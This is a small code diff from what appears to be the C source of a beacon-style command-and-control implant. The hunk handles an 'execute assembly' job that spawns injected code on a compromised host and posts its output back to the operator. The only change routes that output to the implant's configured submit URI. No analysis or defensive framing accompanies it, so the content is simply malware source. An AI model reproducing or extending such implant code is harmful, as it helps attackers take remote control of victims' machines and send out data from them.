@@ -452,7 +452,7 @@ void command_data_store_execute_assembly(char * buffer, int length, BOOL x86, BO
 		_snprintf(line, sizeof(line), "inner=%u x86=%d wait=%u off=%u dll=%d plen=%d\n",
 			inner_type, (int)x86, wait, offset, dlllen, extra.length);
 		command_shell_post(line, (int)lstrlenA(line), CALLBACK_OUTPUT, FALSE);
-		http_flush_post(post_url);
+		http_flush_post(setting_ptr(SETTING_SUBMITURI));
 	}
 	command_job_spawn_logic(jtype, wait, offset, dll, (DWORD)dlllen, extra.buffer, extra.length, desc, dlen, x86, ignoreToken);
 	BeaconDataStoreProtectItem((size_t)index);
